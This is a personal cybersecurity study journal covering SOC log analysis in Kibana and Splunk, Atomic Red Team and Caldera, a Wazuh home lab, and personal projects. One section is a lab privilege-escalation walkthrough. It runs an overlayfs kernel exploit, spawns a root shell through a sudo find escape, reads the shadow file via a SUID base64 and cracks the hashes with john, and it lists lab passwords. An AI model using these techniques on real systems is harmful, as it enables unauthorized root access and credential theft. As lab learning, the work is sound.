AAF - Continued work with Kibana Over the Past Week, Pass-The-Hash - Looking for the exploitation of using stolen hashes to bypass the need for a plaintext password. Certain protocols like NLTM are most susceptible to this. There are certain event numbers that could be potential indicators of the PassTheHash (PTH) attack. 4648 - A logon was attempted using explicit credentials, 4624 - An account was successfully logged on (pay special attention to the Logon Type of 2), 4672 - Special privileges assigned to new logon (Which can be used to track the activity of an administrative account. Going back to the logon type of 4624, a type 2 indicateds an interactive logon which is probably a good sign. A logon type 3 is a network logon and you might find under the event details that NTLM authentication was used. An event logon type of 9 is associated with a NewCredential which could very well be a sign of PTH when investigated closer. Forgot to mention these are SYSMON alerts, if we weren't already tracking

AAF - Following the PTH Attacker - After filtering down to Event ID 4624 and logon type 3 (network) and NLTM I now have 12 events of which two are false positives and the rest are associated with two user accounts. I sort by time to see the order of which these attacks took place and then I view surrounding documents to see what the attacker decided to do once authenticating via PTH. Additionaly I add the user.name filter for the useraccount and remove authenitcation events so I can get down to the juicy stuff. I find cmd and powershell use to change into the admin directory and execute a 'whoami' command. Lastly, I see the attacker change values found in TrustedHosts.

AAG - Getting Started - I know that a user downloaded a program he believed to be 7zip which an attacker took advantage of with a webpage called 7zipp that my guy was unaware enough to click on and download. I struggled to find the exact logs which document the url from which he downloaded the malicious file. The problem was that I was filtering by username and instead I needed to filter by workstation number since it was the workstation that was infected after all and not his user account. Once I located the URL I noticed that the process ID from the log collector is 2036 which means remote code execution attempt over DNS, yikes! 

AAG - I needed to determine the PID for the process that executed the malicious software. We know the malicious software is called 7z2301-x64.msi. Placing that in quotes narrows results to 14 hits. We also know we are looking for an event.action of "Process Create" which leaves us with one hit. The attacker used msiexec.exe to execute the new file that was downloaded. I looked for any other files that were downloaded and executed through powershell using filters for process creation and powershell as a process and then by oldest events first. I filtered by just the command line text which was returned as the parent command and found that a legit version of 7zip was also installed. I found the name of the service associated with the threat so I began to filter by the service name. After discovering the parsing tool being used, I noticed it was being told to write to a file called trash. Pretty funny. So now to look for the final form of trash before extraction to see if they were successful in finding credentials. I sort the newest on top and the final event was the parsing tool being stopped. The event before that has what I want. When looking for reset credentials or new credentials I found a short cut which was unexpected by filtering event.module to only sysmon.

AAH - AtomicTest - This was interesting. This was the first time I used an automation-type tool on a Windows machine. The magic words were Invoke-AtomicTest. You can prefix this with "help" to get an options list. I used -ShowDetails alot to see the various tests being performed as they applied to the various ATT&CK techniques I fed the command. The navigator tool loaded to the virtual machine kind of sucked and was out of date so I went to the live page to determine some of the threat techniques in use. I used the -ShowPrereqs command to determine what can and cannot be run on Windows hosts. I am curious to know if the gaps are filled by using a Linux machine in addition to. I am getting a lot of practice using a combination of options with AtomicTest which is cool

AAI - Caldera Setup and Start - I have the idea that Caldera is very similar to Atomic Red Team and their Atomic Test, but Caldera has quite a bit more options and is a little easier to use. I have two machines. One is a machine I am going to be access the Caldera user interface and then run simulated attacks against the same machine. The other machine is going to Remmina (RDP) into the first machine and also host the Caldera server via Python3. I started up Caldera in a python virtual environment using the following command from within the directory: source ../caldera_venv/bin/activate. I waited for the output that stated "All Systems Ready" which lets me know that Caldera is ready. Next I launched the python 3 web server with: python3 server.py --insecure which will host the Caldera virtual environment. Now I was instructed to access the server using port 8888, which did work, but I am trying to figure out how I would have known that on my own because I don't see it in any terminal output from either the python3 or Caldera commands. I was able to find the reason in the README file which indicated that port 8888 is the default port. I was hoping to find the "default.yml" file or similar file that specified the port, but I couldn't find it and it's time to move on. Fun fact, psh is short for powershell, atleast in Caldera, which is good to know because it is used frequently and this could be letting you know that an attack is going to show up in a powershell window. Once an adversary has been selected there is no need for further action beyond verifying the settings for things such as the executors (example being PowerShell). Next is operations where I create a new operation and specify the adversary previously selected (Enumerator in this case). Advanced options are important to verify. Once I hit start the tasklist begins to populate (we are still in the operations tab). I am able to monitor their progress and view the commands that are being used to simulate these attacks. I've noticed some successes and some failures. I wam able to review the output to better understand why certain tests failed.

AAJ - I needed a break from the SOC Level 2 path so I have been journeying down the Jr. Pen Test path the last week. This is the first time I felt compelled to make an entry here. So today is all about escalating my privilege within a Linux machine. I have access to a low-level user and I began enumerating to find an exploit. I run the uname -a command to get info about the OS and the kernal which leads to an exploit. A quick Google search brings me to a cve.mitre.org page, specifically for CVE-2015-1328 which is described as, "The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.". Cool so next I find that there are two different scripts linked under the references section of the webpage. Admittedly when I open these links I find two scripts that I have no idea what is going on. I was expecting some sort of python3 script but neither appeared to be so. Until I figure out what is going on with these scripts, I know one thing for sure which is that I need to save the scripts to the target machine. The user account I am using straight up sucks. I cannot write to a file and there is no home directory for my user, only for someone else which I can not access. The only place I know I can write to is the /tmp/ directory.

AAJ - Given that I am a noob, I like to use as many resources as possible to solve problems and one of those is ChatGPT which of course can be a bad resource if relied on too heavily and without caution. I arguably use it too much, but I firmly believe I know how to sift through the good and bad information it provides, although I am learning every day. In any case, this is how ChatGPT helped me today: When I couldn't find a place to write a file, I was reminded to use the TMP directory. Once here I was directed to use a file name of ofs.c which was chosen because of the exploit, OverlayFS exploit in C language. THe .c extension indicates it's a C source file, which I never would have figured out on my own. Next I was directed to use gcc which is the GNU Compiler Collection , a standard compiler for the C language and makes the text file an executable script. These are all things I have never had to do before so that is why I felt compelled to make a journal entry. Although I am not jumping into a red team career, it is amazing how much someone can learn about general computer science while working through red team challenges. After I compile the exploit code written in the C language, I execute it and the following output appears in the terminal: "spawning threats >> mount#1 >> mount #2 >> child threads done >> /etc/ld.so.preload created >> creating shared library". And then I ran the sudo -l command to see what sudo priviliges I have gained and badda bing badda boom I have (ALL:ALL) ALL. And whoami reveals that I am infact "root".

AAJ - For the next task my user account has some sudo priviliges to include: "User karen may run the following commands on ip-10-10-197-0:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
Of which ChatGPT informed me that I could take easy advantasge of the /usr/bin/find with the following script: "sudo find / -exec /bin/sh \; -quit" which quickly spawns a root shell. This runs the find command starting at the root directory and then -executes the shell with /bin/sh \; for every thing that is found. It is so simple and intriguing!

AAJ - Capstone - This was a big challenge room full of information and I haven't stopped to document till now because I am now to use everything I have been exposed to so I will take notes now. This is going to be formatted a little different for the sake of ease of readibility as I enumerate this machine...
host = 10.10.140.144
user = leonard, only has permissions to his own home directory and no SUDO :(
pass = Penny123
uname -a = Linux ip-10-10-140-144 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux. I looked for vulnerabilities related to the kernal but nothing seemed like a plausible route
cat /proc/version = Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020
env = PATH=/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin
    I am VERY interested in the fact I can execute scripts via /home/leonard/scripts since I have access to the leonard directory.
Users in /etc/passwd who have bin/bash/ are root, missy, and leonard.
/etc/shadow permission denied
find / -perm -u=s -type f 2>/dev/null searches for all files that have the suid bit set which will allow me to potentially run files with higher permissions than my own.
    SUID bit set binaries of INTEREST:
        /usr/bin/base64, which I can now use to try and read the shadow file. At first John couldnt crack anything. The unshadow method wasnt working so I manually did it and just retrieved the three users myself.
        Then I used hashid to analyze just the hashes to determine a hash type. It was determined that the hashes were SHA-512, so then I told John to just focus on SHA-512 using:
        john --format=sha512crypt shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt and then I got missy's account pretty quick missy:Password1
Now that I was logged in as Missy I needed to backtrack. So I ran sudo -l and determined that I can used sudo in /usr/bin/find
    The command that gains me a shell is sudo find / -exec /bin/sh \; -quit
I struggled to find one of the flags so i used the following command to search for the file: find / -type f -name "*flag1*"








*******************************************************************************************************************************
***BRAVO***

BA - Overview of the SOC automation project. Created a Windows 10 based virtual machine instance on virtual box. On the Windows 10 server we installed a Wazuh agent and a Sysmon64 application which are to send Events to a cloud hosted Wazuh manager. That manage will then send alerts based un prebuilt triggers to another cloud hosted server called Shuffle which will maintain a current encyclopedia of indicators of compromise and analyze the events coming across. Then Shuffle will send events to the theHive which will perform Case Management. Ultimately, I will receive emails about positive alerts and then provide responsive action which will make its way back to the Windows 10 Server.

BA - My original thought is to use AWS free tier to host 2 EC2 instances for the Wazuh manager and theHive. My goal is to do this without paying someone else, so if that means that I will have to spin up another virtual machine or two on my host machine, then so be it. For AWS I am going with the free tier options. I am using Amazon Linux as the OS image, 64-bit architecture, t2.micro (because it is free-tier eligible), a generated key-pair using ED25519 cryptography (over RSA for speed and security), using a firewall that only allows SSH traffic from my host machine's public IP address, 30GB of storage (That is the max for free Tier, but I am worried this will not be enough). I have the EC2 instance up and running and I am not connected via SSH. Because I am using Amazon Linux, I was thrown off having to use yum instead of apt-get. Suprisingly there was nothing to update/upgrade, but I am weary of this. Sadly I couldn't install the Wazuh agent on the Amazon Linux OS I was using and I was given specific info about the recommended OSs. I tried to tell the install command to ignore this, but the shell returned that I was missing the curl dependency. I think I could probably make this work if I really wanted to but ultimately not worth it using the Amazon Linux OS image. So I delete my instance and start over, being sure to use the Ubuntu free tier image this time, everything else is the same.

BA - This time, using Ubuntu I am able to use apt-get update/upgrade. Next step is to install the GPG key. I have forgotten what GPG is so I did some research. GPG is GNU Privacy Guard which is a funny term itself because GNU literally stands for GNU Not Unix (a recursive acronym). GNU is a collection of open-source software, not just any one thing. Linux is a main example of GNU. SO GPG makes more sense now. What GPG does is cryptographically sign software packages allowing for more secure downloads. The first step in installing Wazuh is retieving the public key with curl, a step I couldn't do earlier due to limitations with the Amazon Linux. I ran into a new issue which was not having the permissions to downlaod the GPG key to the keyring location used in "sudo curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg" even though I used "sudo" at the beginning. The problem was that sudo was not being applied to the entire command, so GPT taight me that in cases like this I would put the entire command into quotations and at the begginging I would use "sudo bash -c" which will then apply sudo permissions to everything. Pretty cool and worked flawlessly. Next step was to add the repository. Now we ran into the biggest problem which was not having enough RAM or CPU to do run Wazuh on our EC2 instance which goes to show how limited tha AWS free tier is. My next solution was to run all of these things on virtual machines on my nain computer. It's no big deal because this is all about learning. Again, I want to do this without spending additional money.

BA - I already have a ubuntu machine setup so I just needed to make sure the specs were good to go. Another speed bump, my current ubuntu machine doesn't have enough storage space and I mistakenly thought I could modify that after the fact. So back to the ubuntu website to get the ISO. Now to add my user account to the sudoers list located in /etc/ but I had to su to root, bringing back lots of good memories of the first time I had to do this. I just keep running into problem after problem. A 15 minute job has turned into multiple hours lol. So after multiple Ubuntu installs I had no luck and not really sure why. I will continue to troubleshoot it later but in the meantime, I was able to get Wazuh running on my Kali Linux machine so I am going to try and move forward with that. I have to say, Kali has been an absolute work horse for me. I definitely prefer it over Ubuntu for just about everything.


*******************************************************************************************************************************************************
***CHARLIE***

CA - Splunk Familiarization - Today I practiced using Splunk 8.2.6, going over searching for an index based on a source of logs and setting the timeline to "all time". Practiced searches based on given info. Practiced commands such as table, reverse, head, tail, and dedup to organize and declutter data. Then I proceded to use transformation commands to really visually represent data. Next I am going through the steps of deploying Splunk on a linux server. I run the download files as root and then move the generated folder titled "splunk" to the /opt/ directory. Moving it made it unzip into several files/directories. I run the start splunk command, created an admin account and we are good to go. I access the dashboard at http://coffely:8000. Next I deployed the Splunk forwarder which is supposed to take my various logs and ingest them into splunk. This was also moved to /opt/. During setup I was notified that the default port for Splunk forwarder was already taken (8089) so I changed it to 8090. Now is time for some setup within the web-based dashboard. Within Splunk settings there is an option to setup forwarding and receiving, so I setup receiving on port 9997 and now Splunk will be waiting for data on port 9997. Neato! Moving on to setting up the index which is also found under settings. I create new and give it a name, pretty simple so far. With that done, it is time to activate the forwarding service. With that listening on port 9997, now I determine what logs I want to send which are found in /var/log/. For now I will send syslogs. This is the command for setting up a specific log to be forwarded: ./splunk add monitor /var/log/syslog -index Linux_host. I was able to create events such as adding a user and see those events be ingested into Splunk real time. Now I do the same thing for Windows. The most interesting part was ingesting web logs from a webpage. To do this, the web logs were downloaded to a specified directory on the host machine. With Splunk set up on that same machine, I was able to tell Splunk to continuously add data from that folder, which was possible because of the use of a wild card at the end of the filepath, pretty cool.

CB - RegEx (Regular Expression) - Today I wrestled around with some regex which ultimately is still victorious over me. I will look to see if there is an app that can help me practice this on my phone at night along with the Python learning I do each night. Learning about charsets, metacharacters, and other methods has been interesting. I can definitely see this being applied into daily use as a SOC Analyst so I am hoping to get this down soon. I have had a lot of practice on using regex and stanzas while modifying and creating .conf files for use in my Splunk application.

CC - Learning about ELF files and making a dumb mistake - Now is the time for the THM Fixit challenge. This is exciting. First I load the machine and go the web-hosted Splunk instance and load the fixit application built for this challenge. I will check to see any issues with how the logs are being displayed by running index=*. I am sure to be in verbose mode and have the timeline set to all-time, real-time. I check the local machines download folders and /opt/splunk/ folders to see what I am working with on the local machine. One thing that is bothering me that I had noticed in previous challenges was that the network-logs were unreadable but could be ingested into Splunk without issues and then be readable. I'm sure the reason is pretty simple, but I don't understand it so I want to take the time to find out. I run the following: "hexdump -C -n 64 network-logs" and learned the magic bytes inidicated the file was an ELF binary, which means the text I am seeing when i command "cat network-logs" is raw binary data, not meant to be readable to human, but rather readable to machine. Google Gemeni Advanced recommended some ELF analysis tools; readelf, objdump, and strings. The use of these tools are well-beyond my abilities now, but I did find the use of the strings command to pullout strings of different specified sizes to be interesting. Alright back to the task. Wow, I feel really dumb. It did not register in my head that because the network-logs is an executable that I needed to run it as such instead of trying to "cat" or concatenate the file. Here are some examples of reading the file correctly so that the results are readable and not in binary:
root@tryhackme:/opt/splunk/etc/apps/fixit/default# /opt/splunk/etc/apps/fixit/bin/network-logs
[Network-log]: User named Patricia Allen from Development department accessed the resource Cybertees.THM/dashboard.html from the source IP 192.168.1.2 and country
Germany at: Fri Feb 16 19:19:17 2024
root@tryhackme:/opt/splunk/etc/apps/fixit/default# /opt/splunk/etc/apps/fixit/bin/network-logs| head -n 5
[Network-log]: User named Alice Johnson from Finance department accessed the resource Cybertees.THM/profile.html from the source IP 192.168.2.2 and country
Mexico at: Fri Feb 16 19:19:21 2024

CD - Examining .conf files - I navigate to the /opt/splunk/etc/apps/fixit/default/ folder and find the following .conf files; app.conf and inputs.conf. Recalling from my previous THM room, app.conf is used for the app configuration when setting the app up within Splunk and inputs.conf which tells Splunk where to find data and how to collect it. In my inputs.conf I find the following; index=main, source = networks, sourcetype = network_logs, interval = 1. This tells Splunk that all of the ingested data is to be put into the "main" index. Source = Network will categorize the data so that when I am searching I can reduce the results. Sourcetype = network_logs will allow me to knos the exact source file that the data is coming from. Interval = 1 tells Splunk how often to come back an retrieve data from the monitored file. According to Gemini, I am missing the following; An input type to tell Splunk the to be monitored file's location, and/or script that would execute to pull data. I'll keep this in mind as a move ahead. Within Splunk I observe the logs from the main index and I notice that each individual event is being cut into 2-4 parts so to fix this I need to review the props and transforms.conf files which don't exist in this machine yet. As a review, props.conf is the default file for configuring rules that Splunk applies to incoming data. Transforms.conf is for more advanced applications like changing the name of fields or running calculations. Props is going to be a more general applications while transforms is more specific.

CE - Fixing Event Boundaries - The problem I need to solve is that Splunk cannot determine the Event boundaries, as the events are coming from an unknown device. I execute the network-logs file and receive a single log entry. I learn that all of my logs events begin with "[Network-log]: " so i take the entire log entry and go to regex101 so that I can start crafting some regular expressions to define my event boundaries. The start is \[Network-log\]: . Defining an event end is not necessary because Splunk now knows where a new event begins and is also instructed to merge the lines. The problem is caused by the elf script which inserts a page break right after the word "Country" which is something I need to take into account in the next step.









*******************************************************************************************************************************************************
***DELTA***

DA - Back story - I was working on a big project which required a Wazuh server to be used. The recommended Linux Distros for Wazuh are Ubuntu, CentOS, and Amazon Linux 2 (Which I also might install to be more familiar with for AWS purposes). I don't personally like running Ubuntu in a VM, probably because of something I'm doing. CentOS is reaching end of life in a few more months which is a solid non-option for me, and I didn't realize Amazon Linux 2 was available for download at the time that I came up with this idea for a mini project. So this project is going to be me installing Arch Linux and going through their very in-depth setup guide. I find the install guide interesting because it didn't stop at successfully booting the machine. It's going to go through a lot of post-boot processes for getting the machine in a solid state. I figured there will be something there to learn that can be applied to using any OS on a VM. I am writing this at midnight so I am going to put a pin in this project for now until I find time soon.

DB - The Download, Comparing Hashes with Python Scripts Baby! - There was a download link specifically for use in virtual machines, but it was really confusing to download. I used a youtube video and the person recommended going to the worldwide download option so that is the route we are going. Once downloaded I noticed it opened up as its own disk drive which was really strange to me and them an image file opened up and I was nervous I got caught with a virus. I knew to put my mind at ease I would need to compare the hash value of the file to the expected SHA-256 file. Then I remembered I had built a very basic python script for comparing crypto keys during a key exchange back when I was setting this github up on my computer. I thought why not build a script that takes out the work of remembering the syntax for checking hashes of local files (even though that is good to know, this was cooler). Yes ChatGPT basically wrote it for me. I dabble in Python, but I feel writing scripts at this point in my journey is not the best use of my time. Anyway the script works well and I am still malware free! I went ahead and finished the installation process and booted the machine.

DC - - Slowly realizing that this installation guide is more geared towards using this distro on the host machine and not a virtual machine, so many things are not applicable. I am going to keep going through the guide and also following an awesome youtube video I found. I learned how to check the date and time synch for accuracy. For some reason it displays local time as UTC and even says UTC at the end, but whatever the time is right. At this point I was starting to think that this was the entire archlinux and I was underwhelmed, but then i was overwhelmed when I realize this is just for setting it up. This is pretty cool, the setup process is all done via CLI although the archinstall command does bring up a sort of menu in the terminal that is navigatable. It keeps getting more intersting, there is like 15 different desktop environments. I am going with Gnome like the video guide chose.


************************************************************************************************************************************************************
***ECHO***

EA - Background - I intend to establish my own LLC for a side-business idea that I thought of recently. I only intend to register my LLC once I have moved and gotten settled in. In the meantime, I am working with a free-tier membership of AWS that I intend to use as an experimental webpage for this future LLC. My goal is to have the webpage up and running, ready to support my customer base when the time comes and it is super important to me that this be as low cost as possible. This side-business of mine is not intended to make me lots of money and therefore I don't intend to spend lots of money either. I hope to demonstrate my ability to manage and configure cloud sevices with security and secure code development processes in mind. I want to conduct vulnerability assessments against the webpage and update the webpage to protect it from vulnerabilities. I don't intend to ever process PII or PCI DSS regulated data on the webpage.

EA - The Process - I have identified the following path and stepping stones from where I currently stand. 1. Purchase and configure my website domain name through Amazon Route 53 for DNS management. 2. Use Adobe XD free-options to build a prototype website and then convert the website into static HTML, CSS, and JavaScript files. (probably swap steps 1 and 2 because no need to register a domain if it is not needed to build the prototype first, then when the website is ready I can deploy to start the CI/CD proces) 3. Create an S3 bucket for hosting a static website. 4. Request SSL/TLS certificate through the AWS Certificate Manager and complete the DNS validation process through Route 53. 5. Implement a contact form that forwards webpage user requests to an email inbox using a serverless approach (AWS Lambda and Simple Email Service and consider using AWS API gateway to trigger the Lambda function from the website) and implement CAPTCHA (maybe?) to prevent spam and ensure client/server-side validation is occuring. 6. Begin vulnerability teseting using OWASP ZAP. Continue updating and preparing for launch. Revisit CI/CD implementation throught AWS CodePipeline and AWS CodeBuild. Additional configuration includes setting up AWS CloudWatch for monitor websites health, Google Analystics to learn about my visitor traffic, and implement Search Engine Optimization practices to improve online visability.

EB - Adobe XD - I am straight up nervous about wasting a lot of time here and not getting anywhere. Which was a reasonable concern. I am going down a new route which is having AI write the baseline html code for all of the anticipated webpages I will need for my website and then editing it as I go. I hosted a webserver on one of my virtual machines using python3 -m http.server after saving the html files to a directory. The webpages are functional and the links are all working. It is very basic right now and there is still lots of work to do. The next step will be editing all of the text and making sure all of the links are available on every page. I have a comment/request submission page which is currently not working because POST is not allowed. Once the functionality and text is all there I will work on the presentation of the page.






